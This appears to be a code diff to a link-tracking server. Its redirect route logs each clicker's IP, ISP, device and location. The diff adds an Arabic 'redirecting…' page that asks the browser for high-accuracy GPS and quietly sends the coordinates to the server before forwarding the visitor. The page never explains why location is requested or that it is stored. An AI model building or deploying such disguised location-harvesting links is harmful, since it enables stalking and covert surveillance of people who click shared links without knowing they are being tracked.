@@ -68,8 +68,25 @@ function isPrivateIp(ip) {
 const geoCache = new Map(); // ip -> { at, data }
 const GEO_TTL = 24 * 60 * 60 * 1000;
 
+// Server's own public IP (resolved once, used as fallback for local testing)
+let serverPublicIp = null;
+async function getServerPublicIp() {
+  if (serverPublicIp) return serverPublicIp;
+  try {
+    const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2500) });
+    const j = await r.json();
+    if (j.ip) serverPublicIp = j.ip;
+  } catch { /* ignore */ }
+  return serverPublicIp;
+}
+
 async function lookupGeo(ip) {
-  if (!ip || isPrivateIp(ip)) return { status: 'private' };
+  if (!ip || isPrivateIp(ip)) {
+    const pub = await getServerPublicIp();
+    if (!pub) return { status: 'private' };
+    const data = await lookupGeo(pub);
+    return { ...data, status: data.status === 'ok' ? 'ok (server-ip)' : data.status };
+  }
   const cached = geoCache.get(ip);
   if (cached && Date.now() - cached.at < GEO_TTL) return cached.data;
   try {
@@ -158,7 +175,25 @@ app.get('/api/visits', (req, res) => {
   res.json(out);
 });
 
-// --- /r/:id: log silently, redirect immediately ----------------------------
+// Update a visit with precise GPS coords (called from the tracking page).
+app.post('/api/visits/:visitId/location', (req, res) => {
+  const visitId = Number(req.params.visitId);
+  const { latitude, longitude, accuracy } = req.body || {};
+  if (!Number.isFinite(visitId)) return res.status(400).json({ error: 'Bad visit id' });
+  const visit = store.visits.find(v => v.id === visitId);
+  if (!visit) return res.status(404).json({ error: 'Not found' });
+
+  if (Number.isFinite(latitude) && Number.isFinite(longitude)) {
+    visit.latitude = Number(latitude);
+    visit.longitude = Number(longitude);
+    visit.accuracy = Number.isFinite(accuracy) ? Number(accuracy) : null;
+    visit.geo_status = 'gps';
+    save();
+  }
+  res.json({ ok: true });
+});
+
+// --- /r/:id: log the visit, ask for precise GPS, then redirect -------------
 app.get('/r/:id', async (req, res) => {
   const { id } = req.params;
   const link = store.links.find(l => l.id === id);
@@ -170,12 +205,8 @@ app.get('/r/:id', async (req, res) => {
     || (/mobile/i.test(ua) ? 'mobile' : 'desktop');
   const ip = getClientIp(req);
 
-  // Redirect right away — no intermediate page, nothing visible.
-  res.redirect(302, link.target_url);
-
-  // Lookup geo asynchronously after the response is sent.
+  // Insert the visit immediately so we have an id to update with GPS coords later.
   const geo = await lookupGeo(ip);
-
   const visit = {
     id: store.nextVisitId++,
     link_id: id,
@@ -189,12 +220,69 @@ app.get('/r/:id', async (req, res) => {
     city: geo.city || null,
     latitude: geo.latitude ?? null,
     longitude: geo.longitude ?? null,
+    accuracy: null,
     isp: geo.isp || null,
     geo_status: geo.status,
     visited_at: Date.now(),
   };
   store.visits.push(visit);
   save();
+
+  const target = link.target_url;
+  const safeTitle = String(link.title).replace(/</g, '&lt;');
+  res.set('Cache-Control', 'no-store');
+  res.send(`<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>${safeTitle}</title>
+<style>
+  html,body{margin:0;height:100%;background:#0f172a;color:#e2e8f0;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
+  .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
+  .box{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:22px;max-width:420px;text-align:center}
+  h1{margin:0 0 6px;font-size:18px}
+  p{margin:6px 0;color:#94a3b8;font-size:13px}
+  .spin{width:30px;height:30px;border:3px solid #334155;border-top-color:#38bdf8;border-radius:50%;margin:12px auto;animation:s .8s linear infinite}
+  @keyframes s{to{transform:rotate(360deg)}}
+  a{color:#38bdf8}
+</style>
+</head>
+<body>
+  <div class="wrap"><div class="box">
+    <h1>جاري التحويل…</h1>
+    <div class="spin"></div>
+    <a href="${target.replace(/"/g, '&quot;')}">اضغط هنا لو ما اتحولتش</a>
+  </div></div>
+<script>
+(function(){
+  var visitId=${JSON.stringify(String(visit.id))};
+  var target=${JSON.stringify(target)};
+  var done=false;
+  function send(payload,cb){
+    try{
+      var url='/api/visits/'+encodeURIComponent(visitId)+'/location';
+      var body=JSON.stringify(payload);
+      if(navigator.sendBeacon){
+        navigator.sendBeacon(url,new Blob([body],{type:'application/json'}));
+        cb&&cb();
+      }else{
+        fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:body,keepalive:true}).finally(function(){cb&&cb();});
+      }
+    }catch(e){cb&&cb();}
+  }
+  function go(){if(done)return;done=true;window.location.replace(target);}
+  setTimeout(go,9000); // hard fallback
+  if(!('geolocation' in navigator)){setTimeout(go,200);return;}
+  navigator.geolocation.getCurrentPosition(
+    function(pos){send({latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:pos.coords.accuracy},function(){setTimeout(go,300);});},
+    function(){setTimeout(go,200);},
+    {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+  );
+})();
+</script>
+</body>
+</html>`);
 });
 
 app.listen(PORT, () => {
